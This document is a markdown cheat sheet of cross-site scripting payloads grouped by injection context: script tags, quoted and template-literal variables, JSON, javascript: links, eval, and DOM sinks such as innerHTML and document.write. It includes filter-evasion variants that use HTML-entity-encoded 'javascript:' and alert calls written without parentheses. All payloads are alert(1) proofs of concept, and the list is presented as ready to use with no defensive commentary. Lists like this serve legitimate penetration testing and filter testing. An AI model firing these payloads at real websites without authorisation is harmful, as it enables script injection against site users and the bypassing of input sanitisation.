# XSS JavaScript Context Payloads

## Inside Script Tags
```javascript
';alert(1);//
"-alert(1)-"
</script><script>alert(1)</script>
\';alert(1);//
</script><script>alert(1)</script>
```

## Inside JavaScript Variables
```javascript
var x = 'USER_INPUT';
// Payload: ';alert(1);//

var y = "USER_INPUT";
// Payload: "-alert(1)-"

var z = `USER_INPUT`;
// Payload: `-alert(1)-`
```

## Template Literal Context
```javascript
`-alert(1)-`
`${alert(1)}`
```

## JSON Context
```json
{"key":"</script><script>alert(1)</script>"}
```

## JavaScript URL
```html
<a href="javascript:alert(1)">Click</a>
<a href="java&#x73;cript:alert(1)">Click</a>
<a href="java&#115;cript:alert(1)">Click</a>
```

## eval Context
```javascript
';alert(1);//
'-alert(1)-'
```

## Without Parentheses
```javascript
alert`1`
window['alert'](1)
self['alert'](1)
top['alert'](1)
```

## DOM Manipulation Sinks
```javascript
document.innerHTML = 'USER_INPUT'
document.write('USER_INPUT')
element.outerHTML = 'USER_INPUT'
eval('USER_INPUT')
setTimeout('USER_INPUT')
setInterval('USER_INPUT')
```
